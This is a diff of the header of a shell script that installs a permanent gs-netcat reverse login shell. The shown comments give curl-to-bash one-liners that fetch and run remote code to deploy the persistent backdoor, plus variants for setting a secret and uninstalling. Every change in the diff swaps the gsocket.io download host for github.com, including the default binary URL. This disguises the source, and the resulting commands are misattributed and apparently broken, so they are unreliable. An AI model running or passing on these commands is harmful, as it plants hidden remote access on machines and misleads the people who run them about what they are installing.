@@ -2,17 +2,17 @@
 
 # Install and start a permanent gs-netcat reverse login shell
 #
-# See https://www.gsocket.io/deploy/ for examples.
+# See https://www.github.com/deploy/ for examples.
 #
 # This script is typically invoked like this as root or non-root user:
-#   $ bash -c "$(curl -fsSL https://gsocket.io/x)"
+#   $ bash -c "$(curl -fsSL https://github.com/x)"
 #
 # Connect
-#   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)""
+#   $ S=MySecret bash -c "$(curl -fsSL https://github.com/x)""
 # Pre-set a secret:
-#   $ X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
+#   $ X=MySecret bash -c "$(curl -fsSL https://github.com/x)"
 # Uninstall
-#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://gsocket.io/x)"
+#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://github.com/x)"
 #
 # Other variables:
 # GS_DEBUG=1
@@ -33,7 +33,7 @@
 #       - Force architecutre to a specific package (for testing purpose only)
 # GS_PREFIX=
 #		- Use 'path' instead of '/' (needed for packaging/testing)
-# GS_URL_BASE=https://gsocket.io
+# GS_URL_BASE=https://github.com
 #		- Specify URL of static binaries
 # GS_URL_BIN=
 #		- Specify URL of static binaries, defaults to https://${GS_URL_BASE}/bin
@@ -1599,7 +1599,7 @@ init_vars
 [[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
 
 init_setup
-# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
+# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://github.com/x)"
 [[ -n "$X" ]] && GS_SECRET_X="$X"
 
 if [[ -z $S ]]; then
